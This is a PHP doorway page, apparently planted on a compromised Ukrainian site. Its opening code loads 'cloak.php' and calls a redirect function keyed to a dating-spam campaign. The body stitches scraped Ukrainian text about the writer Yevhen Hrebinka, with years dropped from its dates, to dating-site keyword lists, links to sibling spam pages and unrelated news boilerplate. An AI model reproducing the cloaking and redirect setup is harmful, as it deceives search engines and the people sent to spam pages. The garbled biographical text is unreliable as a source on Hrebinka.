<?php
if(!@include('cloak.php'))	@include('../cloak.php');
if(function_exists('getredir')){
	@getredir ('api', '%d1%81%d0%b0%d0%b9%d1%82+%d0%b7%d0%bd%d0%b0%d0%b9%d0%be%d0%bc%d1%81%d1%82%d0%b2+%d0%bf%d0%be%d0%b1%d0%bb%d0%b8%d0%b7%d1%83+%d0%93%d1%80%d0%b5%d0%b1%d1%96%d0%bd%d0%ba%d0%b0+%d0%a3%d0%ba%d1%80%d0%b0%d1%97%d0%bd%d0%b0', '2021-05-21', 'pir_210521/UA_dat_geo_trans_ukr', 'ua_dating.txt');
}
?><!doctype html>
<html lang="">
<head>
	<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
	<title>На стику двох культур</title>
	<meta name="description" content="Сайт знайомств міста Гребінка ❤❤️ - безкоштовні онлайн знайомства з дівчатами і чоловіками, знайомство в інтернеті Гребінка; Гребінківський" />
	<link rel="canonical" href="https://masage.od.ua/img/137/kap-sayt-znayomstv-poblizu.php" />
<?php if(!@include('../inc1mywp1.php')) @include('inc1mywp1.php'); ?>
						<div id="primary-menu" class="menu"><ul>
<li class="page_item page-item-2"><a href="https://masage.od.ua/img/467/seka-tsentralna-shvidksna.php">центральна швидкісна дата в Українськ Україна</a></li><li class="page_item page-item-2"><a href="https://masage.od.ua/img/249/noti-sayti-znayomstv-bezkoshtovno.php">сайти знайомств безкоштовно в Костянтинівка Україна</a></li><li class="page_item page-item-2"><a href="https://masage.od.ua/img/137/hises-znayomstva-z.php">знайомства з вашими в Кривий Ріг Україна</a></li>
</ul></div>
						<div class="main-navigation-bg"></div>
						<div class="clearfix"></div>
					</nav><!-- #site-navigation -->
				</div>
			</div>

		</div>

	</header><!-- #masthead -->



	<div id="content" class="site-content">
	<div class="container"><div class="row"><div class="col-md-7 order-md-3">
	<div id="primary" class="content-area">
		<main id="main" class="site-main main-content-middle">


<article id="post-1" class="post-1 post type-post status-publish format-standard hentry category-uncategorized">
		<header class="entry-header">
		<h1 class="entry-title">Сайт знайомств поблизу Гребінка Україна</h1><!-- .entry-meta -->
			</header><!-- .entry-header -->



	<div class="entry-content">

<p>
<p>На підтвердження можна згадати, що поданий 7 березня року до цензурного комітету особисто Гребінкою рукопис було повернуто… в той же день! Найімовірніше, автор мав на увазі свого великого учня, який перевершив свого талановитого вчителя в майстерності володіння красним словом. У всякому разі, надалі письменник спеціалізувався в основному на прозі, де, за свідченням книговидавця і журналіста Івана Панаєва, Гребінка «був необхідним, бо його повісті і оповідання дуже подобались більшості читаючої публіки».</p>
		
			<br><ul>
			
				<li>До річчя від дня народження Євгена Павловича Гребінки - Сайт бібліотеки Музичанської ЗОШ;</li>
			
				<li>для знайомств в Острог Україна.</li>
			
				<li>Знайомства Гребінка;</li>
			
			</ul>
		
	<p>Причому йшлося аж ніяк не про швидкоплинний успіх. Так, тонкий знавець психологічних нюансів та лікар за професією Антон Чехов з дитинства був закоханим у «зворушливий твір Гребінки «Доктор», а його історичний роман «Чайковський», за свідченням Івана Франка, належав до улюблених творів «галицько-руської молоді» часів юності Великого Каменяра. Євген Павлович Гребінка народився 2 лютого року на хуторі Убєжище поблизу Пирятина.</p>
<p>Цей куточок полтавської землі став ще й тією бездонною криницею, з якої він черпав теми для своїх літературних праць. Мальовничі пейзажі малої батьківщини органічно впліталися в його твори. Протягом усього життя він линув думками на землю предків, завжди повертався сюди й саме тут знайшов свій останній притулок. Сумним, а чи щасливим, Де б він не був, не жив, Гніздо своє любив він, Бо душу в нім лишив. Ось так поетично змальовує літературні джерела свого видатного земляка поет Андрій Денисенко. Сам же Євген Павлович написав про рідну землю такі чудові рядки: «Уже я так думаю, що нема на світі кращого місця, як Полтавська губернія.</p>
<p>І степи, і ліси, і сади, і байраки, і щуки, і карасі, і вишні, і черешні, і всякі напитки, і воли, і добрі коні, і добрі люди — усе є, усього багацько. А тих, мовляв, дівчат та молодиць!.. Одну списав покійничок Котляревський «Наталку Полтавку» та увесь світ звеселив…». Перше визнання й літературну славу письменникові принесли байки.</p>
<p>Найвідоміші з них — «Ведмежий суд», «Школяр Денис», «Рожа да хміль»,   «Ворона і ягня», «Вовк і огонь». Вони написані алегоричною мовою, за своїми літературними та повчальними якостями стоять на одному рівні з аналогічними творами Григорія Сковороди та Івана Крилова.</p><strong><a id='h1'></a><h2>Гребінка | Знайомства 💗 | Полтавська область — mistaUA</h2></strong><p>Навіть такий вимогливий митець і критик, як Іван Франко назвав Гребінку «автором пречудових байок». Заслуговують на увагу його «Малороссийские присказки», повісті   та романи, захоплюючі нариси. Його переклади — то взагалі окрема тема, варто лишень прочитати поему Пушкіна «Полтава», яку Гребінка переклав українською. За 15 років літературної діяльності він надрукував понад 50 повістей, романів і оповідань. Євген Павлович мало прожив — усього 36 років. Але за цей час встиг зробити чимало добрих справ.</p>
		
			
				<div>Как заставить девушку СКУЧАТЬ по тебе?</div>
				<div><iframe width='560' height='315' src='https://www.youtube.com/embed/GVltFH1rxKk' frameborder='0' allowfullscreen></iframe></div>
			
		
	<p>Зокрема, допоміг викупити з кріпацтва молодого Тараса Шевченка. З ним він пізніше подорожував Україною, заїжджали і на хутір Убєжище. Заснував у Петербурзі альманах «Ластівка», в якому друкували свої твори молоді письменники, вихідці з України. За рік до своєї смерті власним коштом відкрив парафіяльне училище для селянських дітей — у селі Рудці Лубенського повіту.</p>
<p>На його честь названо районний центр, щорічно в день його народження тут проводяться обласне свято «Гребінчина світлиця» та конкурс читців його творів. Гостями свята бувають столичні та зарубіжні науковці й мистецтвознавці, історики й літератори. Гідно відзначає Полтавщина і його двохсотрічний ювілей. До цієї події тут готувалися майже два роки, з обласного та місцевих бюджетів на підготовку було спрямовано сотні тисяч гривень.</p>
<p>Побудовано асфальтову дорогу до села, розроблено туристичні маршрути тощо.</p><a id='h2'></a><h3>Останні новини</h3><p>За спонсорські кошти, силами громади окультурено прилеглу територію. В Полтавському національному педагогічному університеті та в кількох інших вишах обласного центру пройшли наукові конференції та слухання з нагоди ювілею Гребінки. Спеціально до цієї дати обласна телерадіокомпанія зняла фільм. президент україни. Урядовий портал. ВЕРХОВНА РАДА УКРАЇНИ. урядова гаряча лінія  ДЕРЖБЮДЖЕТ  АНТИКОРУПЦІЙНИЙ ПОРТАЛ.</p><img src="https://mistaua.com/filesup/city_map/1849uk.jpg" alt="Видання - 2021" style="max-width: 480px; max-height: 480px;"/><p>ДАТА   У двохсотрічний ювілей Євгена Гребінки доречно згадати,   що письменник — не лише талановитий байкар і прозаїк Старовинний «циганський» романс «Очи черные», текст якого перекладено практично на всі основні мови світу, став мало не візитівкою російської культури. Як Гребінка   маляру допоміг Загальновідомо, що лише завдяки щасливій зустрічі кріпосного учня маляра Шевченка із художником Іваном Сошенком талант Великого Кобзаря не залишився пропащою силою.</p>
		
			<br><ol>
			
				<li>просто знайомства в Білгород-Дністровський Україна.</li>
			
				<li>СВІТ БІБЛІОГРАФА: ЄВГЕН ГРЕБІНКА!</li>
			
				<li>гачок Олевськ Україна?</li>
			
			</ul>
		
	<p>Обкладинка першого «Кобзаря», виданню якого великою мірою посприяв відомий байкар Серед добрих знайомих Гребінки-старшого був всесильний, за відгуками сучасників, конференц-секретар імператорської Академії мистецтв Василь Григорович, про якого Шевченко згодом напише: Якби не він спіткав мене При лихій годині, Давно б досі заховали В снігу на чужині. Одну списав покійничок Котляревський «Наталку Полтавку» та увесь світ звеселив…» Перше визнання й літературну славу письменникові принесли байки.</p><strong><a id='h3'></a><h2>Сайт міста Гребінка</h2></strong><p>Але внесок скромного інтелігента Гребінки в літературу виявився таким, що непідвладний часові. Якщо брати російськомовну частину його спадщини, то такі твори, як історичний роман з епохи козаччини «Чайковский» , «историческая быль» «Нежинский полковник Золотаренко» , соціально-психологічні повісті «Кулик» , «Записки студента» ; до речі, саме тут багато в чому відтворивши події свого дитинства та юності в Ніжині, Гребінка буквально «напророчив» і свою майбутню долю — ранню смерть від безжалісної хвороби , «Приключения синей ассигнации» — всі вони й зараз читаються з інтересом, не втратили ні пізнавальної, ні культурно-естетичної цінності.</p>
<p>А знаменитий романс «Очи черные»? Чи багато хто знає, що й це — не «народне» творіння, його автор — Гребінка! Проте нас зараз більше цікавлять здобутки Євгена Павловича на ниві рідної української культури. Почнемо з того, що, окрім блискучих байок, його перу належать такі ліричні вірші високої вартості, як «Ні, мамо, не можна нелюба любить» «Українська мелодія» , «Ліс» та інші.</p>
<p>Відомими є декілька важливих для України культурних проектів, зініційованих особисто Гребінкою зокрема, це — видання літературного додатка українською мовою до журналу «Отечественные записки»; на жаль, цей задум практично не був реалізований.</p>
		
			<br><ul>
			
				<li>Інтернет знайомства в Білозерське Україна.</li>
			
				<li>оголошення поблизу Немирів Україна.</li>
			
				<li>Батько української байки;</li>
			
			</ul>
		
	<p>Однак, безперечно, в історії України, в історії нашої духовності Євген Павлович Гребінка назавжди залишиться насамперед як людина, за чиєї прямої ініціативи, безпосередньої матеріальної та моральної підтримки був підготовлений до друку й виданий «Кобзар» Тараса Шевченка рік!</p>
<p>Причому ж не слід забувати, що іще раніше, року, Гребінка брав активну участь у викупі Шевченка з кріпацтва, та й згодом залишався одним з його добрих близьких знайомих про що свідчить і той красномовний факт, що саме Євгена Павловича обрав Шевченко своїм супутником під час подорожі Україною року.</p><strong><a id='h4'></a><h2>Гребінка Євген Павлович</h2></strong><p>Помер Євген Павлович Гребінка 15 грудня року, у віці 36 років у Санкт- Петербурзі. Перейти до основного матеріалу. На стику двох культур. Шлях Євгена Гребінки. Ігор СЮНДЮКОВ, «День». Україна Incognita. Головні новини Україна візьме участь у Всесвітній виставці Expo Dubai. Україна та ОАЕ співпрацюватимуть у питанні вакцинації проти COVID Благодійна організація «Фонд сприяння ініціативам газети «День». ХXII Міжнародний фотоконкурс газети «День».</p>
</p>
	</div><!-- .entry-content -->

</article><!-- #post-1 -->


		</main><!-- #main -->
	</div><!-- #primary -->


	</div><div class="col-md-2 order-md-1">

	<aside id="secondary" class="widget-area">
			</aside><!-- #secondary -->
</div><div class="col-md-3 order-md-10">
	<aside id="secondary" class="widget-area">
		<section id="search-2" class="widget widget_search"><form role="search" method="get" class="search-form" action="https://masage.od.ua/img/418/nih-pdklyuchiti-programi-nosvka.php">
				<label>
					<span class="screen-reader-text">Search for:</span>
					<input type="search" class="search-field" placeholder="Search &hellip;" value="" name="s" />
				</label>
				<input type="submit" class="search-submit" value="Search" />
			</form></section>		<section id="recent-posts-2" class="widget widget_recent_entries">		<h2 class="widget-title">Recent Posts</h2>		<ul>
											<li><a href="https://masage.od.ua/img/454/hum-znayomstva-v-koledzh.php">знайомства в коледжі в Берислав Україна</a></li><li><a href="https://masage.od.ua/img/103/xot-sayt-znayomstv.php">сайт знайомств поблизу Балаклія Україна</a></li><li><a href="https://masage.od.ua/img/471/memu-sluzhbi-znayomstv.php">служби знайомств в Вишгород Україна</a></li><li><a href="https://masage.od.ua/img/398/cuky-znayomstva-z-hloptsem.php">знайомства з хлопцем в Мукачево Україна</a></li><li><a href="https://masage.od.ua/img/184/liteq-hristiyansk-sayti-znayomstv.php">християнські сайти знайомств в Українськ Україна</a></li>
					</ul>
		</section>

			<section id="meta-2" class="widget widget_meta"><h2 class="widget-title">Contents</h2>
				<ol><li><a href='#h1'>Гребінка | Знайомства 💗 | Полтавська область — mistaUA</a></li>
<li><a href='#h2'>Останні новини</a></li>
<li><a href='#h3'>Сайт міста Гребінка</a></li>
<li><a href='#h4'>Гребінка Євген Павлович</a></li>
</ol>
			</section>

	</aside><!-- #secondary -->
</div></div></div>	</div>
	<footer id="colophon" class="site-footer">

		<div class="covf-footer-copyright">
			<div class="container">
				<div class="row">
					<div class="col">
						<div class="site-info text-center">
							Powered by 	<a href="https://masage.od.ua/img/398/hysa-azatska-sluzhba-znayomstv.php">Covfefe WordPress Theme</a>
						</div>
					</div>
				</div>
			</div>
		</div>
	</footer><!-- #colophon -->
</div><!-- #page -->

<script type='text/javascript' src='https://masage.od.ua/img/wp-content/themes/covfefe.1.0.2/covfefe/js/jquery.marquee.js?ver=20151215'></script>
<script type='text/javascript' src='https://masage.od.ua/img/wp-content/themes/covfefe.1.0.2/covfefe/js/scripts.js?ver=20151215'></script>
<script type='text/javascript' src='https://masage.od.ua/img/wp-includes/js/comment-reply.min.js?ver=5.0.3'></script>
<script type='text/javascript' src='https://masage.od.ua/img/wp-includes/js/wp-embed.min.js?ver=5.0.3'></script>

</body>
</html>